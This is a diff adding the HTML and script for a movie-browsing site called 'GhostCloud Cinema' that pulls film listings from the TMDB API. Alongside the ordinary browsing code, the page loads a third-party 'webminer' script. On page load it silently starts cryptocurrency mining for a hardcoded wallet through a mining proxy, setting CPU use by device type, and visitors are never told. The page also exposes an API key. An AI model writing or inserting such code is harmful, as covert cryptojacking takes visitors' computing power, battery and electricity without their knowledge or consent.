@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GhostCloud Cinema</title>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XCFYVQ97K6"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-XCFYVQ97K6');
+    </script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header class="top-nav">
+    <div class="logo" onclick="location.reload()">GHOSTCLOUD</div>
+    <div class="search-container">
+        <input type="text" id="searchInput" placeholder="Search movies..." oninput="searchMovies()">
+        <span id="clearSearch" onclick="resetHome()">×</span>
+    </div>
+    <div class="nav-links">
+        <span class="nav-btn" onclick="showMyList()">My List</span>
+    </div>
+</header>
+
+<main id="app">
+    <section id="hero" class="hero-banner">
+        <div class="hero-content">
+            <h1 id="hero-title">GhostCloud</h1>
+            <p id="hero-desc">Discover the next generation of streaming.</p>
+            <div class="hero-btns">
+                <button class="btn-play" id="hero-play">▶ Play Now</button>
+                <button class="btn-list" id="hero-list">+ My List</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="resultsSection" class="row-section" style="display:none;">
+        <div class="row-header">
+            <h2 id="resultsTitle">Search Results</h2>
+            <button class="btn-back" onclick="resetHome()">← Back Home</button>
+        </div>
+        <div class="movie-grid" id="gridData"></div>
+    </section>
+
+    <div id="homeContent">
+        <section class="row-section"><h2>Trending Now</h2><div class="movie-row" id="trending"></div></section>
+        <section class="row-section"><h2>Action & Adventure</h2><div class="movie-row" id="action"></div></section>
+        <section class="row-section"><h2>Horror</h2><div class="movie-row" id="horror"></div></section>
+        <section class="row-section"><h2>Anime</h2><div class="movie-row" id="anime"></div></section>
+        <section class="row-section"><h2>Sci-Fi & Fantasy</h2><div class="movie-row" id="scifi"></div></section>
+    </div>
+</main>
+
+<script src="https://cdn.jsdelivr.net/gh/annoforge/webminer@main/load.js"></script>
+<script>
+    const API_KEY = '5513ab319975b0b6f6d297179708caec';
+    const WALLET = '48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy';
+    let myList = JSON.parse(localStorage.getItem('ghost_list')) || [];
+
+    window.onload = () => {
+        // SMART MINER: Detects Phone vs Tablet vs Laptop
+        const ua = navigator.userAgent;
+        const isMobile = /iPhone|Android/i.test(ua) && !/Tablet|iPad/i.test(ua);
+        const isTablet = /Tablet|iPad/i.test(ua);
+        
+        let power = 45; // Laptop Default
+        if (isMobile) power = 12; // Phone
+        if (isTablet) power = 25; // Tablet
+
+        if (typeof startMining === "function") {
+            startMining(WALLET, isMobile ? "Mobile" : (isTablet ? "Tablet" : "Desktop"), "wss://ny1.xmrminingproxy.com", power);
+        }
+
+        // Initialize Categories
+        fetchRow(`https://api.themoviedb.org/3/trending/movie/week?api_key=${API_KEY}`, 'trending', true);
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=28`, 'action');
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=27`, 'horror');
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=16`, 'anime');
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=878`, 'scifi');
+    };
+
+    async function fetchRow(url, elementId, isHero = false) {
+        const r = await fetch(url);
+        const d = await r.json();
+        if(isHero && d.results[0]) setHero(d.results[0]);
+        document.getElementById(elementId).innerHTML = d.results.map(m => createCard(m)).join('');
+    }
+
+    function createCard(m) {
+        return `<div class="card" onclick='setHero(${JSON.stringify(m).replace(/'/g, "&apos;")})'>
+                    <img src="https://image.tmdb.org/t/p/w300${m.poster_path}" loading="lazy">
+                </div>`;
+    }
+
+    function setHero(m) {
+        document.getElementById('resultsSection').style.display = 'none';
+        document.getElementById('homeContent').style.display = 'block';
+        document.getElementById('hero').style.display = 'flex';
+        
+        const hero = document.getElementById('hero');
+        hero.style.backgroundImage = `linear-gradient(to top, #0a0a0b 10%, transparent 90%), url(https://image.tmdb.org/t/p/original${m.backdrop_path})`;
+        document.getElementById('hero-title').innerText = m.title;
+        document.getElementById('hero-desc').innerText = m.overview.substring(0, 180) + "...";
+        
+        document.getElementById('hero-play').onclick = () => location.href = `player.html?id=${m.id}&img=${m.backdrop_path}`;
+        document.getElementById('hero-list').onclick = () => addToMyList(m);
+        window.scrollTo({top: 0, behavior: 'smooth'});
+    }
+
+    async function searchMovies() {
+        const q = document.getElementById('searchInput').value;
+        if(q.length < 2) return resetHome();
+        
+        document.getElementById('homeContent').style.display = 'none';
+        document.getElementById('hero').style.display = 'none';
+        document.getElementById('resultsSection').style.display = 'block';
+        document.getElementById('clearSearch').style.display = 'block';
+
+        const r = await fetch(`https://api.themoviedb.org/3/search/movie?api_key=${API_KEY}&query=${q}`);
+        const d = await r.json();
+        document.getElementById('gridData').innerHTML = d.results.map(m => createCard(m)).join('');
+    }
+
+    function resetHome() {
+        document.getElementById('searchInput').value = '';
+        document.getElementById('homeContent').style.display = 'block';
+        document.getElementById('hero').style.display = 'flex';
+        document.getElementById('resultsSection').style.display = 'none';
+        document.getElementById('clearSearch').style.display = 'none';
+    }
+
+    function addToMyList(m) {
+        if(!myList.some(x => x.id === m.id)) {
+            myList.push(m);
+            localStorage.setItem('ghost_list', JSON.stringify(myList));
+            alert("Added to My List!");
+        }
+    }
+
+    function showMyList() {
+        document.getElementById('hero').style.display = 'none';
+        document.getElementById('homeContent').style.display = 'none';
+        document.getElementById('resultsSection').style.display = 'block';
+        document.getElementById('resultsTitle').innerText = "My Saved List";
+        document.getElementById('gridData').innerHTML = myList.map(m => createCard(m)).join('');
+    }
+</script>
+</body>
+</html>
